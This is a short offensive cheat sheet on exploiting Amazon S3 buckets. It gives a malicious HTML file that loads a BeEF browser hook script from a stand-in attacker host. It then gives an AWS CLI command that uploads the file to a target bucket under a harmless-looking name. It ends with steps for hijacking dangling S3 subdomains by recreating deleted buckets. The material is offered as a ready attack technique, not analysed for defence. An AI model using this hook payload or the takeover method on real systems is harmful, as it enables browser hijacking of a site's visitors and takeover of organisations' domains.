# S3 exploitation

## S3 code injection

On a writable S3 bucket, create and upload a malicious html file. If a webapplication is pulling data from this bucket, the code will be executed.

### BeeF hook

```bash
<html>
    <head>
    <title>
       Hello from here 
    </title>
    </head>
    <body>
        <p>hook script for BeeF</p>
        <script src="http://attacker_machine:3000/hook.js"></script>
    </body>
</html>
```

### Upload the malicious html file 

```csharp
aws s3 mv my_harmless_file.html s3://target/my_harmless_file.html
```

## S3 hijacking

Search for S3 subdomains which doesn't exist \(404 no suck bucket\)anymore and create it using the same name and region.

